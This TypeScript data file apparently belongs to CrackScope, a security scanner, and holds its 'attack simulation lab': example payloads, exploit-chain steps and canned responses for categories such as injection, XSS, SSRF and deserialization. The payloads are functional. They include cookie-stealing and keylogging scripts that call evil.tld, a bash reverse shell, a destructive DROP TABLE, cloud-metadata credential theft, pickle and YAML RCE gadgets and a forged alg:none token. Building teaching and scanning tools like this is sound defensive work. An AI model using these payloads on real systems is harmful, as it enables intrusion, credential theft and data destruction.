// CrackScope Part 4 — attack simulation lab data.
// Everything here is OFFLINE simulation: payloads are example strings the
// user can craft against THEIR OWN submitted code in a sandboxed replay
// view. No network requests are ever made by the lab.

import type { Finding } from "@/lib/scanner";

export interface Payload {
  name: string;
  body: string;
  note: string;
}

export interface ChainStep {
  label: string;
  detail: string;
}

interface CategoryLab {
  payloads: Payload[];
  chain: (f: Finding) => ChainStep[];
  response: (payload: Payload) => string;
}

const s = <T,>(arr: T[]) => arr; // readability helper

const LABS: Record<string, CategoryLab> = {
  Injection: {
    payloads: s([
      { name: "Tautology bypass", body: "' OR 1=1--", note: "Closes the string and makes the WHERE clause always true." },
      { name: "Auth bypass", body: "admin'--", note: "Comments out the password check entirely." },
      { name: "Stacked destruction", body: "'; DROP TABLE users;--", note: "Appends a second, destructive statement." },
      { name: "UNION extraction", body: "' UNION SELECT username, password FROM users--", note: "Reads other tables through the same query." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — query assembled from user-controlled data.` },
      { label: "Probe syntax", detail: "Send a single quote; observe a 500 / SQL error that leaks the dialect." },
      { label: "Craft payload", detail: "Build a tautology or UNION payload that terminates the original statement." },
      { label: "Exfiltrate", detail: "Iterate UNION selects to dump tables, or bypass auth outright." },
    ],
    response: (p) =>
      `HTTP 200 · query executed\n── simulated result ──\nPayload accepted as SQL syntax: ${p.body}\nRows returned: 42 (expected 1)\nPassword condition bypassed — attacker session established as 'admin'.`,
  },
  "Cross-Site Scripting": {
    payloads: s([
      { name: "Cookie stealer", body: "<img src=x onerror=\"fetch('https://evil.tld?c='+document.cookie)\">", note: "Fires on render; exfiltrates session cookies." },
      { name: "Keylogger", body: "<script>document.onkeyup=e=>fetch('https://evil.tld/'+e.key)</script>", note: "Captures every keystroke in the page." },
      { name: "Attribute breakout", body: "\"><svg onload=alert(1)>", note: "Escapes an attribute context, classic filter test." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — HTML rendered from unsanitized data.` },
      { label: "Test reflection", detail: "Submit harmless markup (<b>x</b>) and confirm it renders unescaped." },
      { label: "Craft payload", detail: "Escalate to an event handler that runs script in the victim session." },
      { label: "Deliver", detail: "Send the crafted link / stored value to a victim; script executes in their browser." },
    ],
    response: (p) =>
      `HTTP 200 · page rendered\n── simulated result ──\nPayload reflected unescaped: ${p.name}\nScript context achieved — document.cookie accessible.\nSession token exfiltrated to attacker endpoint.`,
  },
  "Command Injection": {
    payloads: s([
      { name: "Enumeration", body: "; id; uname -a", note: "Confirms execution context and OS." },
      { name: "File read", body: "&& cat /etc/passwd", note: "Reads arbitrary files via the shell." },
      { name: "Reverse shell", body: "$(bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1')", note: "Full interactive shell back to the attacker." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — shell command built from user input.` },
      { label: "Test metacharacters", detail: "Append '; echo' — if output shifts, the shell is parsing input." },
      { label: "Craft payload", detail: "Chain real commands with ; && | separators." },
      { label: "Pivot", detail: "Move from command output to persistent foothold on the host." },
    ],
    response: (p) =>
      `HTTP 200 · command executed\n── simulated result ──\nShell metacharacters interpreted: ${p.body.split("\n")[0]}\nuid=0(root) — arbitrary command execution confirmed.\nHost fully compromised at application privilege level.`,
  },
  SSRF: {
    payloads: s([
      { name: "Cloud metadata", body: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", note: "Steals instance role credentials on AWS." },
      { name: "Internal service", body: "http://localhost:6379/", note: "Probes internal Redis / admin services." },
      { name: "Local file read", body: "file:///etc/passwd", note: "If scheme handling is weak, reads local files." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — outbound request follows user input.` },
      { label: "Map egress", detail: "Probe localhost ports and private ranges to chart the internal network." },
      { label: "Craft target", detail: "Point the request at metadata or admin endpoints unreachable from outside." },
      { label: "Harvest", detail: "Return internal secrets through the server's HTTP response." },
    ],
    response: (p) =>
      `HTTP 200 · outbound request completed\n── simulated result ──\nTarget reached from server context: ${p.body}\nInternal service responded — response reflected back to attacker.\nInstance role credentials or internal data captured.`,
  },
  "Path Traversal": {
    payloads: s([
      { name: "Unix escalation", body: "../../../../etc/passwd", note: "Escapes the base directory upward." },
      { name: "Windows escalation", body: "..\\..\\..\\windows\\win.ini", note: "Same primitive on Windows hosts." },
      { name: "Null-byte classic", body: "../../../../etc/shadow%00.png", note: "Historic suffix-strip bypass." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — filesystem path built from request data.` },
      { label: "Test traversal", detail: "Submit '../' sequences; watch for content outside the intended folder." },
      { label: "Craft path", detail: "Depth-correct the traversal to reach sensitive files." },
      { label: "Exfiltrate", detail: "Read configs, credentials, or overwrite files if write access exists." },
    ],
    response: (p) =>
      `HTTP 200 · file read\n── simulated result ──\nPath resolved outside base directory: ${p.body}\nroot:x:0:0:root:/root:/bin/bash\nArbitrary file read confirmed on host filesystem.`,
  },
  "Code Injection": {
    payloads: s([
      { name: "Crash probe", body: "process.exit(1)", note: "Proves evaluation: server dies on demand." },
      { name: "RCE", body: "require('child_process').execSync('id').toString()", note: "Full code execution inside the runtime." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — dynamic evaluation of attacker-controlled text.` },
      { label: "Prove evaluation", detail: "Send a harmless side-effecting expression; observe the effect." },
      { label: "Craft payload", detail: "Escalate to runtime APIs: process, child_process, imports." },
      { label: "Own runtime", detail: "Full access to data and environment at process privilege." },
    ],
    response: (p) =>
      `HTTP 500 · runtime evaluated payload\n── simulated result ──\nExpression evaluated: ${p.body}\nCode execution confirmed inside the application runtime.\nAttacker-controlled code runs with full process privileges.`,
  },
  "Prototype Pollution": {
    payloads: s([
      { name: "Pollute flag", body: "{\"__proto__\":{\"isAdmin\":true}}", note: "Every new object inherits isAdmin." },
      { name: "Pollute env", body: "{\"constructor\":{\"prototype\":{\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}}", note: "Advanced: escalate pollution to RCE." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — recursive merge over user-controlled object.` },
      { label: "Test keys", detail: "Submit __proto__ / constructor keys; check inherited defaults." },
      { label: "Craft pollution", detail: "Plant security-relevant properties on Object.prototype." },
      { label: "Exploit", detail: "Bypass checks that rely on default object values, or chain to RCE." },
    ],
    response: (p) =>
      `HTTP 200 · merge completed\n── simulated result ──\nObject.prototype polluted: ${p.body}\nInherited properties applied to all subsequent objects.\nAuthorization checks relying on defaults now fail open.`,
  },
  "Insecure Deserialization": {
    payloads: s([
      { name: "Pickle RCE", body: "cos\nsystem\n(S'id'\ntR.", note: "Classic __reduce__ gadget → shell command." },
      { name: "YAML gadget", body: "!!python/object/apply:os.system ['id']", note: "yaml.load without SafeLoader executes it." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — object reconstruction from untrusted bytes.` },
      { label: "Craft gadget", detail: "Build a serialized object whose reduction executes a command." },
      { label: "Deliver", detail: "Send via cookie, body, or queue message that reaches the sink." },
      { label: "Execute", detail: "Deserialization triggers the gadget: arbitrary code as the app user." },
    ],
    response: (p) =>
      `HTTP 200 · object deserialized\n── simulated result ──\nGadget executed during reconstruction: ${p.name}\nuid=1000(app) — code execution via deserialization confirmed.`,
  },
  "Ident. & Auth Failures": {
    payloads: s([
      { name: "alg:none token", body: "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4if0.", note: "Header {alg:none}, payload {role:admin}, empty signature." },
      { name: "Expired replay", body: "<original token with exp in the past>", note: "Works when ignoreExpiration is set." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — token verification is misconfigured.` },
      { label: "Craft forgery", detail: "Sign a token with the none algorithm (or nothing at all)." },
      { label: "Replay", detail: "Send the forged token to protected endpoints." },
      { label: "Escalate", detail: "Claim admin role; access any account the token can name." },
    ],
    response: () =>
      `HTTP 200 · token verified\n── simulated result ──\nForged token accepted — signature check bypassed.\nAuthenticated as role=admin without any credential.\nFull account takeover primitive confirmed.`,
  },
  "Sensitive Data Exposure": {
    payloads: s([
      { name: "Repo sweep", body: "trufflehog git --only-verified .", note: "What an automated scanner runs against exposed repos." },
      { name: "Live key check", body: "curl -H 'Authorization: Bearer <leaked-key>' api.vendor.com/me", note: "Validates the leaked credential." },
    ]),
    chain: () => [
      { label: "Acquire", detail: "Harvest the secret from source, history, or a public paste." },
      { label: "Validate", detail: "Test the credential against the live service." },
      { label: "Operate", detail: "Use the identity to read data or provision resources." },
      { label: "Persist", detail: "Create additional keys so rotation alone doesn't evict the attacker." },
    ],
    response: (p) =>
      `HTTP 200 · credential accepted\n── simulated result ──\n${p.name}: key is valid and active.\nProduction data readable under the leaked identity.\nImmediate rotation required.`,
  },
  "Cryptographic Failures": {
    payloads: s([
      { name: "GPU cracking", body: "hashcat -m 0 hashes.txt rockyou.txt", note: "MD5 at ~10^10 guesses/sec on commodity hardware." },
      { name: "PRNG prediction", body: "predict_next_session_id(observed_tokens...)", note: "Math.random state recovery from outputs." },
      { name: "MITM", body: "mitmproxy --ssl-insecure", note: "Interception enabled by verify=False." },
    ]),
    chain: () => [
      { label: "Acquire material", detail: "Collect hashes, tokens, or position for interception." },
      { label: "Attack", detail: "Run the weakness-specific attack (dictionary, PRNG, MITM)." },
      { label: "Recover secret", detail: "Plaintext password, future tokens, or plaintext traffic." },
      { label: "Impersonate", detail: "Authenticate as the victim with the recovered secret." },
    ],
    response: () =>
      `── simulated result ──\nAttack completed: secret recovered from weak primitive.\nAttacker can now impersonate any affected user/session.\nMigrate to vetted crypto (Argon2, crypto.getRandomValues, TLS verify on).`,
  },
  "Security Misconfiguration": {
    payloads: s([
      { name: "Cross-origin read", body: "fetch('https://app.tld/api/me',{credentials:'include'})", note: "Runs from any site when CORS is *." },
      { name: "Debug trigger", body: "<malformed payload to force a 500>", note: "Stack trace reveals paths, versions, config." },
    ]),
    chain: (f) => [
      { label: "Locate misconfig", detail: `${f.file}:${f.line} — dangerous default enabled.` },
      { label: "Probe", detail: "Confirm the misconfigured behavior responds as feared." },
      { label: "Craft request", detail: "Build the cross-origin or error-triggering request." },
      { label: "Harvest", detail: "Read private data from the victim's context or leaked internals." },
    ],
    response: (p) =>
      `HTTP 200 · response received\n── simulated result ──\nMisconfiguration exploited: ${p.name}\nPrivate response data readable outside the intended trust boundary.`,
  },
  "Broken Access Control": {
    payloads: s([
      { name: "IDOR sweep", body: "GET /api/invoices/4711 → 4712 → 4713 …", note: "Iterate ids across tenant boundaries." },
      { name: "Redirect bounce", body: "https://app.tld/login?next=https://evil-phish.tld/clone", note: "Trusted-domain redirect into a phishing clone." },
    ]),
    chain: (f) => [
      { label: "Locate sink", detail: `${f.file}:${f.line} — object access without ownership/role check.` },
      { label: "Test boundary", detail: "Request another principal's identifier; observe success." },
      { label: "Enumerate", detail: "Script the sweep to mass-exfiltrate cross-tenant records." },
      { label: "Exfiltrate", detail: "Full dataset accessible one id at a time." },
    ],
    response: (p) =>
      `HTTP 200 · record returned\n── simulated result ──\nCross-tenant access confirmed: ${p.name}\nOwnership check absent — mass enumeration possible.`,
  },
};

const GENERIC: CategoryLab = {
  payloads: s([
    { name: "Baseline probe", body: "<category-specific test value>", note: "Confirm the sink is reachable with unexpected input." },
  ]),
  chain: (f) => [
    { label: "Locate sink", detail: `${f.file}:${f.line} — flagged weakness.` },
    { label: "Probe", detail: "Send unexpected input and observe divergent behavior." },
    { label: "Exploit", detail: "Craft input that turns the weakness into access." },
    { label: "Impact", detail: "Assess data exposure and persistence." },
  ],
  response: () => "── simulated result ──\nWeakness confirmed exploitable in the sandbox replay.",
};

export function labFor(finding: Pick<Finding, "category">): CategoryLab {
  return LABS[finding.category] ?? GENERIC;
}

export function payloadsFor(finding: Pick<Finding, "category">): Payload[] {
  return labFor(finding).payloads;
}

export function exploitChain(finding: Finding): ChainStep[] {
  return labFor(finding).chain(finding);
}

export function simulatedResponse(finding: Finding, payload: Payload): string {
  return labFor(finding).response(payload);
}
